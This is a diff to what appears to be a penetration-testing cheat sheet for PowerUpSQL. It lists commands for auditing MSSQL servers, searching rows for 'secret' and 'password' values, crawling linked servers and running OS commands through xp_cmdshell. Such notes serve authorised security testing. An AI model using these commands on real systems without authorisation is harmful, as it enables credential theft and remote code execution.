@@ -16,14 +16,17 @@ Invoke-sqlaudit -instance <rhost>
 # search database rows for specific keywords (NoDefaults skip default tables)
 Get-SQLColumnSampleData –Verbose –Keyword "secret,password" –SampleSize 10 –NoDefaults -Instance <rhost>
 
-# execute commands
-Get-SQLServerLinkCrawl -Instance <rhost> -Query "exec master..xp_cmdshell '<command>'"
+# execute command
+Invoke-SQLOSCmd -Instance '<rhost>,1433' -Command '<command>' -RawResults
 
 # execute query
 Get-SQLQuery -Instance '<rhost>,1433' -Query 'SELECT * FROM master..sysservers'
 
 # scan for linked databases
 Get-SQLServerLinkCrawl -Instance '<rhost>,1433'
+
+# execute commands on linked instances
+Get-SQLServerLinkCrawl -Instance <rhost> -Query "exec master..xp_cmdshell '<command>'"
 
 # excute command on linked mssql instance via rhost (xp_cmdshell can not be enabled by OpenQuery)
 Get-SQLServerLinkCrawl -Instance '<rhost>,1433' -Query "exec master..xp_cmdshell '<command>' "
